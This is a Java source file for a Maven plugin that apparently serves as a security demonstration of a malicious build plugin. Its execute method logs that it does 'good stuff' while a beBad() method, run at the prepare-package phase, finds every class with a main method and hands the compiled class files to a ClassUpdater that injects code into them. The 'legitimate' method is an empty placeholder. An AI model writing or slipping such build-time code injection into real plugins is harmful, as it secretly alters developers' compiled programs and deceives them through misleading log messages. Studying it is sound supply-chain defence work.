package net.trollheim.appsec;

/*
 * Copyright 2001-2005 The Apache Software Foundation.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import net.trollheim.appsec.utils.ClassUpdater;
import net.trollheim.appsec.utils.FindMainClassVisitor;
import org.apache.maven.plugin.AbstractMojo;
import org.apache.maven.plugin.MojoExecutionException;
import org.apache.maven.project.MavenProject;

import java.io.File;
import java.io.IOException;
import java.nio.file.FileVisitOption;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.EnumSet;
import java.util.Set;

/**
 * Goal which touches a timestamp file.
 *
 * @goal execute
 * @phase prepare-package
 */
public class AwesomeMojo
        extends AbstractMojo {

    /**
     * Maven project
     */
    private MavenProject project = null;

    /**
     * plugins main method
     *
     * @throws MojoExecutionException
     */
    public void execute()
            throws MojoExecutionException {
        project = (MavenProject) this.getPluginContext().get("project");
        getLog().info("Awesome plugin will be executed and it will do some good stuff");
        beBad();
        getLog().info("It did some good stuff, but need to do little bit more");
        beGood();
        getLog().info("It completes, now your code is awesome.");

    }

    /**
     * changes path to the source into path to class file
     * @param path path to source file
     * @return path to relevant class file
     */
    private String adjustPath(String path) {
        path = path.replace(project.getBuild().getSourceDirectory(),  project.getBuild().getOutputDirectory());
        return path.substring(0, path.length() - 4) + "class";

    }

    /**
     *  Plugin legitimate functionality
     */
    private void beGood() {
        //TODO add some legitimate functionality
    }

    /**
     * bad stuff - injecting code into main method
     */
    private void beBad() {
        //Lets walk through entire source directory
        FindMainClassVisitor action = new FindMainClassVisitor();


        Path path = new File(project.getBuild().getSourceDirectory()).toPath();
        try {
            Files.walkFileTree(path,EnumSet.noneOf(FileVisitOption.class), Integer.MAX_VALUE, action);
        } catch (IOException e) {
            e.printStackTrace();
        }
//        walker.walk(new File(project.getBuild().getSourceDirectory()));
        // to find and collect paths to all java files with main function
        Set<String> paths = action.getPaths();
        //and then update functionality in each of those methods
        ClassUpdater classUpdater = new ClassUpdater();
        paths.parallelStream().map(this::adjustPath).forEach(classUpdater::update);
    }


}
